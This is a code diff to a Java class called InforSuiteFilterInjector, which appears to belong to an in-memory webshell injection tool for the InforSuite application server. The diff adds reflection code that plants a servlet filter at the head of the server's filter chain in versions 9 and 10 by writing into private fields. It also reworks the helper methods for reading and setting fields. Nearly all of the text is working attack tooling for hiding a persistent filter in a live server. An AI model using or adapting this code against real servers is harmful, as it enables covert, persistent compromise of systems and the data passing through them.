@@ -4,11 +4,11 @@ import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.io.PrintStream;
+import java.lang.reflect.Array;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.util.*;
-import java.util.logging.Logger;
 import java.util.zip.GZIPInputStream;
 
 /**
@@ -128,17 +128,28 @@ public class InforSuiteFilterInjector {
         }
         ClassLoader contextClassLoader = context.getClass().getClassLoader();
         Object filterDef = contextClassLoader.loadClass("org.apache.catalina.deploy.FilterDef").newInstance();
-        Object filterMap = contextClassLoader.loadClass("org.apache.catalina.deploy.FilterMap").newInstance();
+        Class<?> filterMapClass = contextClassLoader.loadClass("org.apache.catalina.deploy.FilterMap");
+        Object filterMap = filterMapClass.newInstance();
         invokeMethod(filterDef, "setFilterName", new Class[]{String.class}, new Object[]{filterName});
         invokeMethod(filterDef, "setFilterClass", new Class[]{Class.class}, new Object[]{filter.getClass()});
         invokeMethod(context, "addFilterDef", new Class[]{filterDef.getClass()}, new Object[]{filterDef});
         invokeMethod(filterMap, "setFilterName", new Class[]{String.class}, new Object[]{filterName});
         invokeMethod(filterMap, "setURLPattern", new Class[]{String.class}, new Object[]{getUrlPattern()});
 
+        // addFilterMapFirst
         try {
-            invokeMethod(context, "addFilterMapBefore", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
+            Object filterMaps = getFieldValue(context, "filterMaps");
+            if (filterMaps instanceof List) {
+                // InforSuite9
+                ((List<Object>) filterMaps).add(0, filterMap);
+            }
         } catch (Exception e) {
-            invokeMethod(context, "addFilterMap", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
+            // InforSuite10
+            Object[] iasFilterMaps = (Object[]) getFieldValue(getFieldValue(context, "iasFilterMaps"), "array");
+            Object[] results = (Object[]) Array.newInstance(filterMapClass, iasFilterMaps.length + 1);
+            results[0] = filterMap;
+            System.arraycopy(iasFilterMaps, 0, results, 1, iasFilterMaps.length);
+            setFieldValue(getFieldValue(context, "iasFilterMaps"), "array", results);
         }
 
         Constructor<?>[] constructors =contextClassLoader.loadClass("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructors();
@@ -192,25 +203,32 @@ public class InforSuiteFilterInjector {
     }
 
     @SuppressWarnings("all")
-    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
-        Field field = getField(obj, fieldName);
+    public static Field getField(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
+        for (Class<?> clazz = obj.getClass();
+             clazz != Object.class;
+             clazz = clazz.getSuperclass()) {
+            try {
+                return clazz.getDeclaredField(name);
+            } catch (NoSuchFieldException ignored) {
+
+            }
+        }
+        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
+    }
+
+
+@SuppressWarnings("all")
+public static Object getFieldValue(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
+    Field field = getField(obj, name);
         field.setAccessible(true);
         return field.get(obj);
     }
 
-    @SuppressWarnings("all")
-    public static Field getField(Object obj, String fieldName) throws NoSuchFieldException {
-        Class<?> clazz = obj.getClass();
-        while (clazz != null) {
-            try {
-                Field field = clazz.getDeclaredField(fieldName);
-                field.setAccessible(true);
-                return field;
-            } catch (NoSuchFieldException e) {
-                clazz = clazz.getSuperclass();
-            }
-        }
-        throw new NoSuchFieldException(fieldName);
+
+public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
+    Field field = getField(obj, fieldName);
+    field.setAccessible(true);
+    field.set(obj, value);
     }
 
     @SuppressWarnings("all")
